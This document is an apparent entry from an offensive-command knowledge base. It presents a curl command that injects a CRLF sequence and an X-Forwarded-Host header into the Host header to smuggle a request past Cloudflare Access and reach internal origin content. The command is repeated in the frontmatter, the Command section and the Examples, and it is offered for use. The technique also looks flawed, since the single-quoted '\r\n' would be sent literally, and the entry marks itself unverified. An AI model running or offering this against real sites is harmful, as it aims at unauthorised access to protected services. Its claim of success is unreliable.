---
data: >-
  curl 'https://target.cloudflare-managed-domain.com/' -H 'Host:
  example.com\r\nX-Forwarded-Host: internal.origin' --data
  'smuggled_request_body'
tags:
  - bypass
  - smuggling
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: aa6d4320-c4d8-43d4-98a4-fa0f04d25cd9
created_at: '2025-12-13T09:01:22.242Z'
updated_at: '2025-12-13T09:01:22.242Z'
verified: false
validated: true
submitted: true
---
# curl-bypass-access

## Command

```bash
curl 'https://target.cloudflare-managed-domain.com/' \
  -H 'Host: example.com\r\nX-Forwarded-Host: internal.origin' \
  --data 'smuggled_request_body'
```

## Description

Sends a smuggled request to bypass Cloudflare Access.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-H 'Host: ...'` | Injected Host header with CRLF | Yes |

## Examples

### Basic Usage

```bash
curl 'https://target.cloudflare-managed-domain.com/' \
  -H 'Host: example.com\r\nX-Forwarded-Host: internal.origin' \
  --data 'smuggled_request_body'
```

## Expected Output

Internal server response content.

## Related

- [[commands/curl-inject-crlf]]
- [[procedures/Bypass-Security-Controls-via-Request-Smuggling]]
